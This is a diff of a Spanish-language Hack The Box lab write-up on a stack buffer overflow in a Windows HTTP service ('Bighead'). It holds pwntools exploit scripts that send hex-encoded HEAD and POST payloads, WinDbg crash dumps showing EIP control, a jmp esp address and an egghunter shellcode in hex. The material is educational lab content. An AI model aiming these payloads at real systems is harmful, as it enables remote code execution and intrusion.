+<p class="plain-text">Indicamos <code class="language-plaintext highlighter-rouge">AA</code> como en el programa, ahora el valor inicial es <code class="language-plaintext highlighter-rouge">0x4141</code> y lo convierte a <code class="language-plaintext highlighter-rouge">170</code> o <code class="language-plaintext highlighter-rouge">0xAA</code> en hexadecimal por lo que el valor original que era <code class="language-plaintext highlighter-rouge">AA</code> como string o <code class="language-plaintext highlighter-rouge">0x4141</code> como <code class="language-plaintext highlighter-rouge">word</code> en hexadecimal paso a ser solo un <code class="language-plaintext highlighter-rouge">byte</code> con valor <code class="language-plaintext highlighter-rouge">0xAA</code></p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="no">char </span><span class="o">*</span><span class="p">__cdecl </span><span class="na">Function4</span><span class="p">(</span><span class="no">char </span><span class="o">*</span><span class="am">param_1</span><span class="p">)
-{
-  </span><span class="no">char </span><span class="p">buffer[</span><span class="mi">32</span><span class="p">]; </span><span class="c1">// [esp+18h] [ebp-20h] BYREF  
-
-  </span><span class="o">return </span><span class="no">strcpy</span><span class="p">(buffer, param_1);
-}</span>
+<code><span class="o">char *</span><span class="p">string</span><span class="o"> =</span><span class="s"> "AA"</span><span class="p">;  </span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Antes de seguir necesitamos solucionar un problema y es que si ejecutamos el <code class="language-plaintext highlighter-rouge">exe</code> nos dice que falta una libreria, podemos simplemente <a href="https://sourceforge.net/projects/mingw/files/MinGW/Base/mingwrt/mingwrt-5.0.2/">descargarla</a> en el directorio</p>
-<a href="/hackthebox/bighead/11.png" target="_blank"><div><p><img src="/hackthebox/bighead/11.png"></p></div></a>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ gcc </span><span class="p">code.c -o code  
+
+</span><span class="ve">❯ ./code</span><span class="p">
+4141 -> 170 -> AA</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Luego de repetir ese bucle hasta que todo el buffer tome ese formato salta al bloque verde que le pasa el nuevo buffer a <code class="language-plaintext highlighter-rouge">Function4</code> y envia una respuesta con <code class="language-plaintext highlighter-rouge">send</code></p>
+<a href="/hackthebox/bighead/23.png" target="_blank"><div><p><img src="/hackthebox/bighead/23.png"></p></div></a>
+
+<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">Function4</code> es bastante simple, toma el buffer y lo copia a un nuevo destino usando <code class="language-plaintext highlighter-rouge">strcpy</code>, sin embargo aqui encontramos la vulnerabilidad ya que lo guarda en <code class="language-plaintext highlighter-rouge">ebp - 32</code> y si pasamos ese buffer empezaremos a sobrescribir otros datos</p>
+<a href="/hackthebox/bighead/24.png" target="_blank"><div><p><img src="/hackthebox/bighead/24.png"></p></div></a>
+
+<p class="plain-text">Para analizar la vulnerabilidad encontrada ejecutaremos la aplicación desde <code class="language-plaintext highlighter-rouge">WinDbg</code></p>
+<a href="/hackthebox/bighead/27.png" target="_blank"><div><p><img src="/hackthebox/bighead/27.png"></p></div></a>
+
+<p class="plain-text">Ahora que conocemos la vulnerabilidad enviaremos nuestro payload en una petición <code class="language-plaintext highlighter-rouge">HEAD</code>, sin embargo debido a la comparación que vimos antes sabemos que no podemos exceder un tamaño de <code class="language-plaintext highlighter-rouge">219</code> por lo que nos quedan unos <code class="language-plaintext highlighter-rouge">200</code> libres</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> remote
+
+payload </span><span class="o">= </span><span class="no">b</span><span class="s">"A"</span><span class="o"> *</span><span class="mi"> 200</span><span class="p">
+
+content </span><span class="o">=</span><span class="no"> f</span><span class="s">"HEAD /</span><span class="p">{payload}</span><span class="s"> HTTP/1.1"</span><span class="p">.encode()  
+
+shell </span><span class="o">=</span><span class="p"> remote(</span><span class="s">"192.168.100.5"</span><span class="p">,</span><span class="mi"> 8008</span><span class="p">)
+shell.sendline(content)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Luego de enviar el exploit si miramos desde el debugger el programa corrompe, pero en lugar de ver un <code class="language-plaintext highlighter-rouge">0x41414141</code> vemos <code class="language-plaintext highlighter-rouge">0xaaaaaaaa</code>, esto es debido a lo explicando anteriormente con <code class="language-plaintext highlighter-rouge">ida</code> en el bucle antes reverseando donde se llama a <code class="language-plaintext highlighter-rouge">strtoul</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">0:000></span><span class="p"> g
+(35dc.24a4): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=00f2fb14 ebx=00000194 ecx=00d21728 edx=000000aa esi=0040194e edi=0040194e  
+eip=aaaaaaaa esp=00f2fb3c ebp=aaaaaaaa iopl=0         nv up ei pl zr na pe nc  
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246  
+aaaaaaaa ??              ???</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">La solución es simple, enviar su valor en hexadecimal por ejemplo si queremos enviar <code class="language-plaintext highlighter-rouge">A</code> enviaremos <code class="language-plaintext highlighter-rouge">41</code>, esto podemos automatizarlo en python usando <code class="language-plaintext highlighter-rouge">.hex()</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import </span><span class="p">remote
+
+payload </span><span class="o">=</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="mi"> 100</span><span class="p">
+
+content </span><span class="o">=</span><span class="no"> f</span><span class="s">"HEAD /</span><span class="p">{payload.hex()}</span><span class="s"> HTTP/1.1"</span><span class="p">.encode()  
+
+shell</span><span class="o"> =</span><span class="p"> remote(</span><span class="s">"192.168.100.5"</span><span class="p">,</span><span class="mi"> 8008</span><span class="p">)
+shell.sendline(content)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Nuevamente enviamos el exploit esta vez con la mitad de tamaño ya que ahora por cada <code class="language-plaintext highlighter-rouge">byte</code> se envian <code class="language-plaintext highlighter-rouge">2</code>, ahora el valor de retorno si que toma <code class="language-plaintext highlighter-rouge">0x41414141</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">0:000></span><span class="p"> g
+(25e8.3c6c): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=0123fb14 ebx=00000174 ecx=00881728 edx=01000000 esi=0040194e edi=0040194e  
+eip=41414141 esp=0123fb3c ebp=41414141 iopl=0         nv up ei pl zr na pe nc  
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246  
+41414141 ??              ???</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Tomamos el control de la dirección de retorno sin embargo aun nos enfrentamos a otro problema y es el tamaño del payload ya que si excede de <code class="language-plaintext highlighter-rouge">219</code> bytes nunca entrará a la función vulnerable y el uso de <code class="language-plaintext highlighter-rouge">strtoul</code> solo lo empeora más ya que reduce ese tamaño por la mitad, ahora solo tenemos un aproximado de <code class="language-plaintext highlighter-rouge">100</code> bytes</p>
 
 </section>
 
 <section class="post" id="bof-egghunter">
 <br><h3 class="post-title">Buffer Overflow - egghunter</h3><br>
 
-<p class="plain-text">Para debuggear el binario usaremos <a href="https://x64dbg.com/">x32dbg</a> con el plugin <a href="https://github.com/x64dbg/x64dbgpy">x64dbgpy</a> y el modulo <a href="https://github.com/corelan/mona">mona</a>, asi que abrimos el exe <code class="language-plaintext highlighter-rouge">exe</code> y lo corremos, ademas de importar el modulo</p>
-<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="p">from mona import mona</span>
-</code></pre></div></div><br>
-<a href="/hackthebox/bighead/12.png" target="_blank"><div><p><img src="/hackthebox/bighead/12.png"></p></div></a>
-
-<p class="plain-text">Podemos empezar creando un script que envie una petición de tipo <code class="language-plaintext highlighter-rouge">HEAD</code> a el servidor y en la ruta intentaremos sobreescribir el buffer enviando <code class="language-plaintext highlighter-rouge">100 A's</code></p>
-<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="c1">#!/usr/bin/python3
-</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote
-
-payload </span><span class="o">=</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> * </span><span class="mi">100</span><span class="p">
-
-content </span><span class="o">= </span><span class="no">f</span><span class="s">"HEAD /</span><span class="p">{payload} </span><span class="s">HTTP/1.1"</span><span class="p">.encode()  
-
-shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"192.168.100.5"</span><span class="p">, </span><span class="mi">8008</span><span class="p">)
-
-shell.sendline(content)
-shell.close()</span>
-</code></pre></div></div><br>
-
-<p class="plain-text">Tenemos un pequeño problema y es que toma <code class="language-plaintext highlighter-rouge">2</code> caracteres para un solo <code class="language-plaintext highlighter-rouge">byte</code> por lo que en lugar de representarnos un <code class="language-plaintext highlighter-rouge">41</code> como normalmente pasa, nos muestra <code class="language-plaintext highlighter-rouge">AA</code></p>
-<a href="/hackthebox/bighead/14.png" target="_blank"><div><p><img src="/hackthebox/bighead/14.png"></p></div></a>
-
-<p class="plain-text">Para solucionar esto enviaremos solo <code class="language-plaintext highlighter-rouge">50 A's</code> pero haremos un <code class="language-plaintext highlighter-rouge">.hex()</code> para enviarlas en <code class="language-plaintext highlighter-rouge">hexadecimal</code> y asi poder obtener la representacion que necesitamos</p>
-<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="c1">#!/usr/bin/python3
-</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote
-
-payload </span><span class="o">= </span><span class="no">b</span><span class="s">"A"</span><span class="o"> * </span><span class="mi">50</span><span class="p">
-
-content </span><span class="o">= </span><span class="no">f</span><span class="s">"HEAD /</span><span class="p">{payload.hex()}</span><span class="s"> HTTP/1.1"</span><span class="p">.encode()  
-
-shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"192.168.100.5"</span><span class="p">, </span><span class="mi">8008</span><span class="p">)
-
-shell.sendline(content)
-shell.close()</span>
-</code></pre></div></div><br>
-
-<p class="plain-text">Si corremos el programa nuevamente sobreescribimos el registro <code class="language-plaintext highlighter-rouge">EIP</code> pero en lugar de ver <code class="language-plaintext highlighter-rouge">AA</code> como antes podemos ver su representación en hexadecimal como <code class="language-plaintext highlighter-rouge">41</code></p>
-<a href="/hackthebox/bighead/15.png" target="_blank"><div><p><img src="/hackthebox/bighead/15.png"></p></div></a>
-
-<p class="plain-text">Necesitamos saber la cantidad de <code class="language-plaintext highlighter-rouge">bytes</code> necesarios antes de llegar a <code class="language-plaintext highlighter-rouge">EIP</code> ya que sera nuestro puntero, creamos una cadena de <code class="language-plaintext highlighter-rouge">50</code> bytes usando <code class="language-plaintext highlighter-rouge">pattern_create</code></p>
-<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="p">mona("pattern_create 50")</span>
-</code></pre></div></div><br>
-<a href="/hackthebox/bighead/13.png" target="_blank"><div><p><img src="/hackthebox/bighead/13.png"></p></div></a>
-
-<p class="plain-text">Modificamos el script cambiando las <code class="language-plaintext highlighter-rouge">A's</code> por la cadena especialmente diseñada para encontrar un <code class="language-plaintext highlighter-rouge">offset</code>, corremos de nuevo el programa y nuevamente se corrompe</p>
-<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="c1">#!/usr/bin/python3
-</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote
-
-payload </span><span class="o">= </span><span class="no">b</span><span class="s">"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab"</span><span class="p">  
-
-content </span><span class="o">= </span><span class="no">f</span><span class="s">"HEAD /</span><span class="p">{payload.hex()}</span><span class="s"> HTTP/1.1"</span><span class="p">.encode()  
-
-shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"192.168.100.5"</span><span class="p">, </span><span class="mi">8008</span><span class="p">)
-
-shell.sendline(content)
-shell.close()</span>
-</code></pre></div></div><br>
-
-<a href="/hackthebox/bighead/16.png" target="_blank"><div><p><img src="/hackthebox/bighead/16.png"></p></div></a>
-
-<p class="plain-text">Lo que haremos sera usar <code class="language-plaintext highlighter-rouge">pattern_offset</code> para encontrar el offset o bytes basura necesarios, le pasamos como argumento el valor de <code class="language-plaintext highlighter-rouge">EIP</code> y nos dice que son <code class="language-plaintext highlighter-rouge">36</code></p>
-<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="p">mona("pattern_offset 41326241")</span>
-</code></pre></div></div><br>
-<a href="/hackthebox/bighead/17.png" target="_blank"><div><p><img src="/hackthebox/bighead/17.png"></p></div></a>
-
-<p class="plain-text">Para comprobarlo en el script enviaremos <code class="language-plaintext highlighter-rouge">36 A's</code> que son las necesarias antes de EIP seguidos de <code class="language-plaintext highlighter-rouge">4 B's</code> que si el calculo es correcto deberia sobreescribir <code class="language-plaintext highlighter-rouge">EIP</code></p>
+<p class="plain-text">El buffer incia el <code class="language-plaintext highlighter-rouge">ebp - 32</code> por lo que si sumamos esos <code class="language-plaintext highlighter-rouge">32</code> bytes mas <code class="language-plaintext highlighter-rouge">4</code> de ebp tenemos el offset a la dirección de retorno en el stack, podemos comprobar esto enviando <code class="language-plaintext highlighter-rouge">36 A's</code> seguidas de <code class="language-plaintext highlighter-rouge">4 B's</code> como la dirección de retorno y luego <code class="language-plaintext highlighter-rouge">C's</code></p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="c1">#!/usr/bin/python3
 </span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote
 
 offset </span><span class="o">= </span><span class="mi">36</span><span class="p">
 junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">offset
-eip </span><span class="o">=</span><span class="no"> b</span><span class="s">"B"</span><span class="o"> * </span><span class="mi">4</span><span class="p">
 
-payload </span><span class="o">= </span><span class="p">junk </span><span class="o">+ </span><span class="p">eip
+ret </span><span class="o">=</span><span class="no"> b</span><span class="s">"B"</span><span class="o"> *</span><span class="mi"> 4</span><span class="p">
+stack </span><span class="o">=</span><span class="no"> b</span><span class="s">"C"</span><span class="o"> *</span><span class="mi"> 60</span><span class="p">
 
-content </span><span class="o">= </span><span class="no">f</span><span class="s">"HEAD /</span><span class="p">{payload.hex()} </span><span class="s">HTTP/1.1"</span><span class="p">.encode()  
-
-shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"192.168.100.5"</span><span class="p">, </span><span class="mi">8008</span><span class="p">)
-
-shell.sendline(content)
-shell.close()</span>
-</code></pre></div></div><br>
-
-<p class="plain-text">Esta vez sobreescribimos el registro <code class="language-plaintext highlighter-rouge">EIP</code> pero tenemos el control del puntero que ahora tiene como valor <code class="language-plaintext highlighter-rouge">42424242</code> que es la representacion en hexadecimal de <code class="language-plaintext highlighter-rouge">BBBB</code></p>
-<a href="/hackthebox/bighead/18.png" target="_blank"><div><p><img src="/hackthebox/bighead/18.png"></p></div></a>
-
-<p class="plain-text">Lo siguiente sera listar los <code class="language-plaintext highlighter-rouge">modulos</code> que parafraseando seran el programa y librerias importadas en ejecución, ahi encontramos el <code class="language-plaintext highlighter-rouge">exe</code> y el <code class="language-plaintext highlighter-rouge">dll</code> sin ninguna proteccion</p>
-<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="p">mona("modules")</span>
-</code></pre></div></div><br>
-<a href="/hackthebox/bighead/19.png" target="_blank"><div><p><img src="/hackthebox/bighead/19.png"></p></div></a>
-
-<p class="plain-text">Para poder ejecutar nuestro shellcode sera necesario hacer un <code class="language-plaintext highlighter-rouge">jmp esp</code>, con mona buscamos una direccion que haga esa intruccion y aunque en el exe no hay ninguna direccion que salte al <code class="language-plaintext highlighter-rouge">ESP</code> si indicamos como modulo el <code class="language-plaintext highlighter-rouge">dll</code> encontramos varias</p>
-<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="p">mona("jmp -r esp -m bheadsvr.dll")</span>
-</code></pre></div></div><br>
-<a href="/hackthebox/bighead/20.png" target="_blank"><div><p><img src="/hackthebox/bighead/20.png"></p></div></a>
-
-<p class="plain-text">Tenemos otro problema y es que si despues del <code class="language-plaintext highlighter-rouge">jmp esp</code> enviamos <code class="language-plaintext highlighter-rouge">50</code> o mas bytes el programa no llega a ejecutar <code class="language-plaintext highlighter-rouge">Function4</code> ya que el if pide que sea menor de <code class="language-plaintext highlighter-rouge">219</code> bytes por lo que este ni siquiera se corrompe, enviemos <code class="language-plaintext highlighter-rouge">49</code> por ahora</p>
-<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="c1">#!/usr/bin/python3
-</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote, p32
-
-offset </span><span class="o">= </span><span class="mi">36</span><span class="p">
-junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">offset
-jmpesp </span><span class="o">= </span><span class="p">p32(</span><span class="mi">0x625012f0</span><span class="p">)
-stack </span><span class="o">= </span><span class="no">b</span><span class="s">"C"</span><span class="o"> * </span><span class="mi">49</span><span class="p">
-
-payload </span><span class="o">= </span><span class="p">junk </span><span class="o">+ </span><span class="p">jmpesp </span><span class="o">+ </span><span class="p">stack
+payload</span><span class="o"> =</span><span class="p"> junk</span><span class="o"> +</span><span class="p"> ret</span><span class="o"> +</span><span class="p"> stack
 
 content </span><span class="o">= </span><span class="no">f</span><span class="s">"HEAD /</span><span class="p">{payload.hex()} </span><span class="s">HTTP/1.1"</span><span class="p">.encode()  
 
 shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"192.168.100.5"</span><span class="p">, </span><span class="mi">8008</span><span class="p">)
-
-shell.sendline(content)
-shell.close()</span>
+shell.sendline(content)</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Enviando <code class="language-plaintext highlighter-rouge">49</code> o menos el programa corrompe y almacena nuestras <code class="language-plaintext highlighter-rouge">C's</code> en la pila, sin embargo 49 bytes son muy pocos para un <code class="language-plaintext highlighter-rouge">shellcode</code>, podriamos pensar en volver a <code class="language-plaintext highlighter-rouge">EAX</code> pero no tiene sentido ya que tendriamos incluso menos, solo <code class="language-plaintext highlighter-rouge">36</code> bytes</p>
-<a href="/hackthebox/bighead/21.png" target="_blank"><div><p><img src="/hackthebox/bighead/21.png"></p></div></a>
-
-<p class="plain-text">Para bypassear esta resctricción de espacio podemos jugar con un <code class="language-plaintext highlighter-rouge">egghunter</code>, con mona podemos crear uno que busca la cadena <code class="language-plaintext highlighter-rouge">w00t</code> y pesa apenas <code class="language-plaintext highlighter-rouge">32</code> bytes</p>
+<p class="plain-text">Esta vez sobreescribimos el retorno pero tenemos el control del puntero que ahora tiene como valor <code class="language-plaintext highlighter-rouge">0x42424242</code> que es la representacion en hexadecimal de las <code class="language-plaintext highlighter-rouge">B's</code>, además de las otras <code class="language-plaintext highlighter-rouge">60 C's</code> en el stack, que por la limitación es el aproximado de espacio que tenemos disponible para nuestro shellcode al ejecutar un <code class="language-plaintext highlighter-rouge">jmp esp</code></p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="p">mona("egghunter")</span>
-</code></pre></div></div><br>
-<a href="/hackthebox/bighead/22.png" target="_blank"><div><p><img src="/hackthebox/bighead/22.png"></p></div></a>
+<code><span class="ro">0:000> </span><span class="p">g
+(30ac.123c): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=010cfb14 ebx=0000017c ecx=00ec1728 edx=01000000 esi=0040194e edi=0040194e  
+eip=42424242 esp=010cfb3c ebp=41414141 iopl=0         nv up ei pl zr na pe nc  
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246  
+42424242 ??              ???
 
-<p class="plain-text">La idea es simple, enviamos una petición <code class="language-plaintext highlighter-rouge">POST</code> usando como data el <code class="language-plaintext highlighter-rouge">egg</code> 2 veces seguido del <code class="language-plaintext highlighter-rouge">shellcode</code> que seran <code class="language-plaintext highlighter-rouge">100 C's</code>, esto se guardara en algun lugar de la <code class="language-plaintext highlighter-rouge">memoria</code> y cuando saltamos al <code class="language-plaintext highlighter-rouge">ESP</code> podemos ejecutar el <code class="language-plaintext highlighter-rouge">egghunter</code> que buscara el huevo que es <code class="language-plaintext highlighter-rouge">w00t</code> 2 veces y ejecutara lo que esta despues osea el shellcode</p>
+</span><span class="ro">0:000></span><span class="p"> db esp
+010cfb3c  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
+010cfb4c  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
+010cfb5c  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
+010cfb6c  43 43 43 43 43 43 43 43-43 43 43 43 00 00 00 00  CCCCCCCCCCCC....
+010cfb7c  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
+010cfb8c  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
+010cfb9c  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
+010cfbac  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podriamos usar un <code class="language-plaintext highlighter-rouge">egghunter</code> pero necesitamos un lugar donde depositar el shellcode sin restricciones de espacio, siguiendo la flecha donde excedemos el tamaño de <code class="language-plaintext highlighter-rouge">219</code> podemos encontrar la comparación con el método <code class="language-plaintext highlighter-rouge">POST /</code>, aunque aqui no hay vulnerabilidades sabemos que el buffer se encontrará en la memoria</p>
+<a href="/hackthebox/bighead/25.png" target="_blank"><div><p><img src="/hackthebox/bighead/25.png"></p></div></a>
+
+<p class="plain-text">Estableceremos <code class="language-plaintext highlighter-rouge">w00tw00t</code> como huevo que será un valor que luego podemos buscar en memoria y asi conocer la dirección del shellcode, además enviamos <code class="language-plaintext highlighter-rouge">100 D's</code> simulando un shellcode, en la segunda parte explotamos la vulnerabilidad</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="c1">#!/usr/bin/python3
-</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote, p32
+</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> remote
 
-egg </span><span class="o">= </span><span class="no">b</span><span class="s">"w00t"</span><span class="o"> * </span><span class="mi">2</span><span class="p">
-shellcode </span><span class="o">= </span><span class="no">b</span><span class="s">"C" </span><span class="o">* </span><span class="mi">100</span><span class="p">
+egg </span><span class="o">= </span><span class="no">b</span><span class="s">"w00t"</span><span class="o"> *</span><span class="mi"> 2</span><span class="p">
+shellcode</span><span class="o"> =</span><span class="no"> b</span><span class="s">"D"</span><span class="o"> *</span><span class="mi"> 100</span><span class="p">
 
-payload </span><span class="o">= </span><span class="p">egg </span><span class="o">+ </span><span class="p">shellcode
+payload </span><span class="o">= </span><span class="p">egg</span><span class="o"> +</span><span class="p"> shellcode
 
-content </span><span class="o">= </span><span class="no">b</span><span class="s">"POST / HTTP/1.1</span><span class="mi">\r\n</span><span class="s">" </span><span class="o">+ </span><span class="p">payload
+content</span><span class="o"> =</span><span class="no"> b</span><span class="s">"POST / HTTP/1.1</span><span class="mi">\r\n</span><span class="s">"</span><span class="o"> +</span><span class="p"> payload
 
-shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"192.168.100.5"</span><span class="p">, </span><span class="mi">8008</span><span class="p">)
-
+shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"192.168.100.5"</span><span class="p">,</span><span class="mi"> 8008</span><span class="p">)
 shell.sendline(content)
-shell.recv()
 shell.close()
 
 offset </span><span class="o">= </span><span class="mi">36</span><span class="p">
-junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">offset
+junk</span><span class="o"> =</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="p"> offset
 
-jmpesp </span><span class="o">= </span><span class="p">p32(</span><span class="mi">0x625012f0</span><span class="p">)
+ret</span><span class="o"> =</span><span class="no"> b</span><span class="s">"B"</span><span class="o"> *</span><span class="mi"> 4</span><span class="p">
+stack</span><span class="o"> =</span><span class="no"> b</span><span class="s">"C"</span><span class="o"> *</span><span class="mi"> 60</span><span class="p">
 
-egghunter  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
-egghunter </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74</span><span class="s">"</span><span class="p">  
-egghunter </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7</span><span class="s">"</span><span class="p">  
+payload </span><span class="o">= </span><span class="p">junk</span><span class="o"> +</span><span class="p"> ret</span><span class="o"> +</span><span class="p"> stack
 
-payload </span><span class="o">= </span><span class="p">junk </span><span class="o">+ </span><span class="p">jmpesp </span><span class="o">+ </span><span class="p">egghunter
+content</span><span class="o"> =</span><span class="no"> f</span><span class="s">"HEAD /</span><span class="p">{payload.hex()}</span><span class="s"> HTTP/1.1"</span><span class="p">.encode()  
 
-content </span><span class="o">= </span><span class="no">f</span><span class="s">"HEAD /</span><span class="p">{payload.hex()}</span><span class="s"> HTTP/1.1"</span><span class="p">.encode()
-</span><span class="p">
-shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"192.168.100.5"</span><span class="p">, </span><span class="mi">8008</span><span class="p">)
-
-shell.sendline(content)
-shell.close()</span>
+shell</span><span class="o"> =</span><span class="p"> remote(</span><span class="s">"192.168.100.5"</span><span class="p">,</span><span class="mi"> 8008</span><span class="p">)
+shell.sendline(content)</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Como no queremos que se ejecute ahora el egghunter usaremos un <code class="language-plaintext highlighter-rouge">breakpoint</code> en la dirección que ejecuta el <code class="language-plaintext highlighter-rouge">jmp esp</code> para detenernos justo antes de el egghunter</p>
-<a href="/hackthebox/bighead/23.png" target="_blank"><div><p><img src="/hackthebox/bighead/23.png"></p></div></a>
-
-<p class="plain-text">Corremos el programa y nos detenemos en el <code class="language-plaintext highlighter-rouge">jmp esp</code>, lo que haremos sera ver si el <code class="language-plaintext highlighter-rouge">egg</code> se almaceno en algun lugar de la memoria asi que buscamos la string <code class="language-plaintext highlighter-rouge">w00tw00t</code></p>
-<a href="/hackthebox/bighead/24.png" target="_blank"><div><p><img src="/hackthebox/bighead/24.png"></p></div></a>
-
-<p class="plain-text">Como resultado obtenemos un solo <code class="language-plaintext highlighter-rouge">match</code> y en las referencias podemos verlo</p>
-<a href="/hackthebox/bighead/25.png" target="_blank"><div><p><img src="/hackthebox/bighead/25.png"></p></div></a>
-
-<p class="plain-text">Si vemos esa direccion de la memoria en el volcado podemos ver la cadena del <code class="language-plaintext highlighter-rouge">egg</code> que es <code class="language-plaintext highlighter-rouge">w00tw00t</code> y despues las <code class="language-plaintext highlighter-rouge">C's</code> que seria el equivalente a nuestro shellcode</p>
-<a href="/hackthebox/bighead/26.png" target="_blank"><div><p><img src="/hackthebox/bighead/26.png"></p></div></a>
-
-<p class="plain-text">Lo siguiente sera buscar <code class="language-plaintext highlighter-rouge">badchars</code> que puedan hacer que nuestro shellcode no funcione, para ello con mona creamos un <code class="language-plaintext highlighter-rouge">bytearray</code> con los 256 bytes posibles</p>
-<a href="/hackthebox/bighead/27.png" target="_blank"><div><p><img src="/hackthebox/bighead/27.png"></p></div></a>
-
-<p class="plain-text">Modificamos la variable <code class="language-plaintext highlighter-rouge">shellcode</code> de nuestro script por el bytearray y lo corremos</p>
+<p class="plain-text">Luego de enviar el exploit podemos buscar el huevo en toda la memoria de usuario, al encontrar la dirección sabemos que <code class="language-plaintext highlighter-rouge">8</code> bytes después se encontraran las <code class="language-plaintext highlighter-rouge">D's</code>, aunque esta dirección es dinamica y se encuentra en el <code class="language-plaintext highlighter-rouge">heap</code> no afectará el exploit</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="p">shellcode </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
+<code><span class="ro">0:000></span><span class="p"> g
+(1044.a68): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=0102fb14 ebx=00000184 ecx=00e21728 edx=01000000 esi=0040194e edi=0040194e
+eip=42424242 esp=0102fb3c ebp=41414141 iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246
+42424242 ??              ???
+
+</span><span class="ro">0:000></span><span class="p"> s -a 0 L?80000000 w00tw00t
+00e22861  77 30 30 74 77 30 30 74-44 44 44 44 44 44 44 44  w00tw00tDDDDDDDD
+
+</span><span class="ro">0:000></span><span class="p"> db 00e22861 L50
+00e22861  77 30 30 74 77 30 30 74-44 44 44 44 44 44 44 44  w00tw00tDDDDDDDD
